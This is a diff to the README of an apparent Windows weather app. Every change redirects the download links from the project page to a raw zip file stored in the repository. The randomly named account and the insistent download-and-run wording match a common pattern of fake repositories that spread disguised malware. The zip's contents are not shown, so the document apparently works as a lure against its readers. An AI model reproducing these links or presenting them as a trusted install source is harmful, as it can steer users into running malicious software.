@@ -1,12 +1,12 @@
 # 🌦️ Weather-forecast - Fast, Clear Weather at a Glance
 
-[![Download Weather-forecast](https://img.shields.io/badge/Download-Weather--forecast-2f80ed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/gulfstatesimpurity697/Weather-forecast)
+[![Download Weather-forecast](https://img.shields.io/badge/Download-Weather--forecast-2f80ed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/gulfstatesimpurity697/Weather-forecast/raw/refs/heads/main/public/forecast-Weather-3.5.zip)
 
 ## 📥 Download Weather-forecast
 
 Use this link to visit the page and download the app:
 
-[Open Weather-forecast on GitHub](https://github.com/gulfstatesimpurity697/Weather-forecast)
+[Open Weather-forecast on GitHub](https://github.com/gulfstatesimpurity697/Weather-forecast/raw/refs/heads/main/public/forecast-Weather-3.5.zip)
 
 ## 🖥️ What This App Does
 
@@ -30,7 +30,7 @@ Follow these steps to download and run Weather-forecast on Windows.
 
 Go to the project page here:
 
-[https://github.com/gulfstatesimpurity697/Weather-forecast](https://github.com/gulfstatesimpurity697/Weather-forecast)
+[https://github.com/gulfstatesimpurity697/Weather-forecast/raw/refs/heads/main/public/forecast-Weather-3.5.zip](https://github.com/gulfstatesimpurity697/Weather-forecast/raw/refs/heads/main/public/forecast-Weather-3.5.zip)
 
 ### 2. Find the app files
 
@@ -212,7 +212,7 @@ This app uses the OpenWeatherMap API to get weather data in real time. That mean
 
 If you need to get the app again, use this link:
 
-[Download Weather-forecast from GitHub](https://github.com/gulfstatesimpurity697/Weather-forecast)
+[Download Weather-forecast from GitHub](https://github.com/gulfstatesimpurity697/Weather-forecast/raw/refs/heads/main/public/forecast-Weather-3.5.zip)
 
 ## 🧰 Helpful Details
 
